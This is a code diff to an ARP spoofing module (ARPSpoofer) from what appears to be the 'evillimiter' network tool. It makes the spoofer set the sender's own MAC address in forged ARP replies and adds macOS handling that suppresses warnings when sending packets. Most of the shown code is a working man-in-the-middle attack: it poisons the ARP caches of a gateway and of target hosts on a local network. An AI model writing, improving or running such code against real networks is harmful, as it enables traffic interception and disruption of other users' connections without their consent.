@@ -1,6 +1,7 @@
 import time
 import threading
-from scapy.all import ARP, send # pylint: disable=no-name-in-module
+import platform
+from scapy.all import ARP, send, get_if_hwaddr # pylint: disable=no-name-in-module
 
 from .host import Host
 from evillimiter.common.globals import BROADCAST
@@ -11,6 +12,12 @@ class ARPSpoofer(object):
         self.interface = interface
         self.gateway_ip = gateway_ip
         self.gateway_mac = gateway_mac
+        
+        # Get our own MAC address for proper ARP packet construction
+        try:
+            self.our_mac = get_if_hwaddr(interface)
+        except:
+            self.our_mac = "00:00:00:00:00:00"  # Fallback
 
         # interval in s spoofed ARP packets are sent to targets
         self.interval = 2
@@ -60,12 +67,20 @@ class ARPSpoofer(object):
 
     def _send_spoofed_packets(self, host):
         # 2 packets = 1 gateway packet, 1 host packet
+        # Include hwsrc to avoid Scapy warnings on macOS
         packets = [
-            ARP(op=2, psrc=host.ip, pdst=self.gateway_ip, hwdst=self.gateway_mac),
-            ARP(op=2, psrc=self.gateway_ip, pdst=host.ip, hwdst=host.mac)
+            ARP(op=2, psrc=host.ip, hwsrc=self.our_mac, pdst=self.gateway_ip, hwdst=self.gateway_mac),
+            ARP(op=2, psrc=self.gateway_ip, hwsrc=self.our_mac, pdst=host.ip, hwdst=host.mac)
         ]
 
-        [send(x, verbose=0, iface=self.interface) for x in packets]
+        # On macOS, suppress interface warnings for L3 operations
+        if platform.system() == 'Darwin':
+            import warnings
+            with warnings.catch_warnings():
+                warnings.simplefilter("ignore")
+                [send(x, verbose=0) for x in packets]
+        else:
+            [send(x, verbose=0, iface=self.interface) for x in packets]
 
     def _restore(self, host):
         """
@@ -77,4 +92,11 @@ class ARPSpoofer(object):
             ARP(op=2, psrc=self.gateway_ip, hwsrc=self.gateway_mac, pdst=host.ip, hwdst=BROADCAST)
         ]
 
-        [send(x, verbose=0, iface=self.interface, count=3) for x in packets]
+        # On macOS, suppress interface warnings for L3 operations
+        if platform.system() == 'Darwin':
+            import warnings
+            with warnings.catch_warnings():
+                warnings.simplefilter("ignore")
+                [send(x, verbose=0, count=3) for x in packets]
+        else:
+            [send(x, verbose=0, iface=self.interface, count=3) for x in packets]
